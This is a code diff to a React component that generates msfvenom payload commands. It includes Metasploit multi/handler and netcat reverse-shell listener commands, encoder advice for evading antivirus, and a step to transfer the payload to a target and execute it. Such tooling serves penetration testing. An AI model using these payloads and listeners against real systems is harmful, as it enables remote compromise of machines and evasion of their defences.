@@ -6,7 +6,7 @@ import { CopyButton } from "@/components/ui/CopyButton";
 import { Tooltip } from "@/components/ui/Tooltip";
 import { iconButtonClasses, inputClasses, selectClasses, toggleButtonClasses } from "@/components/ui/formClasses";
 import { ArchId, MSFVENOM_ARCHS_BY_ID } from "@/lib/msfvenom/archs";
-import { EncoderId, MSFVENOM_ENCODERS, MSFVENOM_ENCODERS_BY_ID, NONE_ENCODER } from "@/lib/msfvenom/encoders";
+import { EncoderId, MSFVENOM_ENCODERS_BY_ID, NONE_ENCODER, encodersForArch } from "@/lib/msfvenom/encoders";
 import { FormatId, MSFVENOM_FORMATS_BY_ID } from "@/lib/msfvenom/formats";
 import {
   MsfvenomSelection,
@@ -14,6 +14,7 @@ import {
   buildCommand,
   buildListenerParamsOnly,
   hasNoEncoderRisk,
+  requiresOutputFilename,
   resolvePayloadId,
   suggestFilename,
 } from "@/lib/msfvenom/generate";
@@ -114,8 +115,9 @@ export function MsfvenomGeneratorTool() {
   const hostValidation = useMemo(() => validateLhost(lhost), [lhost]);
   const port = Number(lportText);
   const portValid = lportText.trim().length > 0 && isValidPort(port);
-  const iterationsValid = isValidIterations(iterations, encoderId);
-  const filenameValid = !format.producesFile || isValidFilename(filename);
+  const iterationsValid = isValidIterations(iterations, encoder);
+  const needsFilename = requiresOutputFilename(payload, format);
+  const filenameValid = !needsFilename || isValidFilename(filename);
   const canGenerateNow = hostValidation.ok && portValid && iterationsValid && filenameValid;
 
   const filteredPayloads = useMemo(() => MSFVENOM_PAYLOADS.filter((p) => p.platform === platformFilter), [platformFilter]);
@@ -124,6 +126,9 @@ export function MsfvenomGeneratorTool() {
     [filteredPayloads],
   );
   const formatOptions = useMemo(() => payload.compatibleFormats.map((id) => MSFVENOM_FORMATS_BY_ID[id]), [payload]);
+  /** Real msfvenom encoders are arch-scoped (x86/... vs x64/...) — only offer encoders compatible
+   *  with the currently selected architecture (or just "none" for archless payloads like Python). */
+  const encoderOptions = useMemo(() => encodersForArch(archId), [archId]);
 
   const liveRisk = hasNoEncoderRisk(payload, encoder);
 
@@ -135,14 +140,20 @@ export function MsfvenomGeneratorTool() {
   );
   const generatedRisk = generatedSelection ? hasNoEncoderRisk(generatedSelection.payload, generatedSelection.encoder) : false;
 
+  /** Usage Guide listener commands track the live LHOST/LPORT inputs (not the frozen
+   *  generatedSelection) so editing them after generating updates the guide immediately —
+   *  falling back to the last-generated values only while the live input is invalid/empty. */
+  const guideLhost = hostValidation.ok ? lhost.trim() : (generatedSelection?.lhost ?? lhost.trim());
+  const guideLport = portValid ? clampPort(port) : (generatedSelection?.lport ?? clampPort(port));
+
   function resetToCustom() {
     setTemplateId(null);
   }
 
-  /** Reconciles Format/Arch/EXITFUNC/Filename against a newly-selected payload, in case the
-   *  current values fall outside what the new payload supports. Reads the *current* (pre-update)
-   *  render's closure values once, decides next values, and calls each setter exactly once —
-   *  mirrors SqliGeneratorTool's selectDialect() pattern. */
+  /** Reconciles Format/Arch/EXITFUNC/Encoder/Filename against a newly-selected payload, in case
+   *  the current values fall outside what the new payload (or its new arch) supports. Reads the
+   *  *current* (pre-update) render's closure values once, decides next values, and calls each
+   *  setter exactly once — mirrors SqliGeneratorTool's selectDialect() pattern. */
   function applyPayloadReconciliation(nextPayload: (typeof MSFVENOM_PAYLOADS)[number]) {
     const nextFormatId = nextPayload.compatibleFormats.includes(formatId) ? formatId : nextPayload.compatibleFormats[0];
     const nextArchId: ArchId | null =
@@ -152,10 +163,15 @@ export function MsfvenomGeneratorTool() {
           ? archId
           : (nextPayload.defaultArch ?? nextPayload.archs[0]);
     const nextExitfunc: ExitfuncId | null = nextPayload.supportsExitfunc ? (exitfunc ?? "thread") : null;
+    const encoderStillValid = encodersForArch(nextArchId).some((e) => e.id === encoderId);
 
     setFormatId(nextFormatId);
     setArchId(nextArchId);
     setExitfunc(nextExitfunc);
+    if (!encoderStillValid) {
+      setEncoderId("none");
+      setIterations(0);
+    }
 
     if (!filenameTouched) {
       setFilename(suggestFilename(nextPayload, MSFVENOM_FORMATS_BY_ID[nextFormatId], nextArchId));
@@ -203,6 +219,10 @@ export function MsfvenomGeneratorTool() {
   function selectArch(id: ArchId) {
     setArchId(id);
     resetToCustom();
+    if (!encodersForArch(id).some((e) => e.id === encoderId)) {
+      setEncoderId("none");
+      setIterations(0);
+    }
     if (!filenameTouched) {
       setFilename(suggestFilename(payload, format, id));
     }
@@ -335,7 +355,7 @@ export function MsfvenomGeneratorTool() {
     }
     setBlockedMsg(null);
 
-    const finalFilename = format.producesFile
+    const finalFilename = needsFilename
       ? isValidFilename(filename)
         ? filename
         : sanitizeFilename(filename, DEFAULTS.filename)
@@ -459,13 +479,16 @@ export function MsfvenomGeneratorTool() {
                 <Tooltip text={encoder.whyUseIt} />
               </label>
               <select value={encoderId} onChange={(e) => selectEncoder(e.target.value as EncoderId)} className={`${selectClasses} w-full`}>
-                {MSFVENOM_ENCODERS.map((enc) => (
+                {encoderOptions.map((enc) => (
                   <option key={enc.id} value={enc.id}>
                     {enc.label}
                   </option>
                 ))}
               </select>
               <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">{encoder.whyUseIt}</p>
+              {archId === null && (
+                <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">This payload has no architecture, so no binary encoders apply.</p>
+              )}
             </div>
             <div>
               <label className="mb-1 flex items-center text-sm font-medium">
@@ -488,7 +511,8 @@ export function MsfvenomGeneratorTool() {
           </div>
           {liveRisk && (
             <Callout variant="warning">
-              This payload has no encoding. Antivirus may detect it. Consider adding an encoder above (shikata_ga_nai is a good default).
+              This payload has no encoding. Antivirus may detect it. Consider adding an encoder above (x86/shikata_ga_nai is a good default
+              on x86; x64/xor_dynamic for x64).
             </Callout>
           )}
         </div>
@@ -722,16 +746,16 @@ export function MsfvenomGeneratorTool() {
             <input
               type="text"
               value={filename}
-              disabled={!format.producesFile}
+              disabled={!needsFilename}
               onChange={(e) => setFilenameWrapped(e.target.value)}
               className={`${inputClasses} disabled:opacity-40`}
             />
-            {format.producesFile && filename.length > 0 && !filenameValid && (
+            {needsFilename && filename.length > 0 && !filenameValid && (
               <p className="mt-1 text-xs text-red-600 dark:text-red-400">
                 Filename can only contain letters, numbers, dots, hyphens, and underscores.
               </p>
             )}
-            {!format.producesFile && (
+            {!needsFilename && (
               <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">This format prints to the console — no -o filename is generated.</p>
             )}
           </div>
@@ -809,16 +833,24 @@ export function MsfvenomGeneratorTool() {
                 <p className="mb-1 text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Multi/handler (works for all Metasploit payloads)</p>
                 <div className="flex items-center justify-between gap-2">
                   <code className="block flex-1 rounded border border-zinc-200 bg-white p-2 text-xs break-all dark:border-zinc-800 dark:bg-zinc-900">
-                    {`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${generatedSelection.lhost}; set LPORT ${generatedSelection.lport}; run"`}
+                    {`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
                   </code>
                   <CopyButton
-                    text={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${generatedSelection.lhost}; set LPORT ${generatedSelection.lport}; run"`}
+                    text={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
                   />
                 </div>
               </div>
-              <p>
-                For plain (non-Meterpreter) shell payloads, a raw listener also works: <code>nc -nlvp {generatedSelection.lport}</code>
-              </p>
+              <div>
+                <p className="mb-1 text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">
+                  Raw listener (plain, non-Meterpreter shell payloads only)
+                </p>
+                <div className="flex items-center justify-between gap-2">
+                  <code className="block flex-1 rounded border border-zinc-200 bg-white p-2 text-xs break-all dark:border-zinc-800 dark:bg-zinc-900">
+                    {`nc -nlvp ${guideLport}`}
+                  </code>
+                  <CopyButton text={`nc -nlvp ${guideLport}`} />
+                </div>
+              </div>
               <p>
                 Transfer the generated file to the target and execute it. If nothing connects back, check: the listener is running, LHOST is
                 reachable from the target (not 127.0.0.1), and firewall rules on both ends.
